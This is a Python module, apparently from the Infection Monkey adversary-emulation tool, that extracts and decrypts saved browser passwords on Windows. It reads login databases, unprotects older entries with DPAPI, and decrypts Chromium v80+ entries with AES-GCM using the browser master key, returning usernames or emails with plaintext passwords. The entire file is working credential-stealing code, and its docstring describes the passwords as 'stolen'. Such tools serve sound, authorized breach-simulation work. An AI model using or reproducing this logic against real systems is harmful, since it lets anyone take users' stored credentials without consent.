import logging
from collections.abc import Collection
from contextlib import suppress
from typing import Optional

from Cryptodome.Cipher import AES

from common.credentials import Credentials, EmailAddress, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .database_reader import DatabaseReader
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)


class WindowsCredentialsDatabaseProcessor:
    def __init__(self, database_reader: DatabaseReader):
        self._read_logins_from_database = database_reader

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = []

        for item in interruptible_iter(database_paths, interrupt):
            for user, password in self._read_logins_from_database(item.database_file_path):
                decrypted_password = self._decrypt_password(password, item.master_key)
                if user or decrypted_password:
                    credentials.append((user, decrypted_password))
        return [
            Credentials(
                identity=self._get_identity(user),
                secret=self._get_password(password),
            )
            for user, password in set(credentials)
        ]

    @staticmethod
    def _get_identity(user: str):
        try:
            return EmailAddress(email_address=user)
        except ValueError:
            return Username(username=user)

    @staticmethod
    def _get_password(password: Optional[str]) -> Optional[Password]:
        if password is None:
            return None
        return Password(password=password)

    def _decrypt_password(
        self, encrypted_password: bytes, master_key: Optional[bytes]
    ) -> Optional[str]:
        decrypted_password = None
        if encrypted_password.startswith(b"v10"):  # chromium > v80
            with suppress(UnicodeDecodeError, ValueError):
                decrypted_password = self._decrypt_password_v80(encrypted_password, master_key)
        else:
            with suppress(Exception):
                password_bytes = win32crypt_unprotect_data(encrypted_password)
                if isinstance(password_bytes, bytes):
                    decrypted_password = password_bytes.decode("utf-8")

        return decrypted_password

    def _decrypt_password_v80(
        self, encrypted_password: bytes, master_key: Optional[bytes]
    ) -> Optional[str]:
        """
        Decrypts passwords stolen from browsers with Chromium > v80
        """

        if not master_key:
            return None

        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_password = cipher.decrypt(payload)
        decrypted_password = decrypted_password[:-16].decode()  # remove suffix bytes

        if decrypted_password == "":
            return None

        return decrypted_password
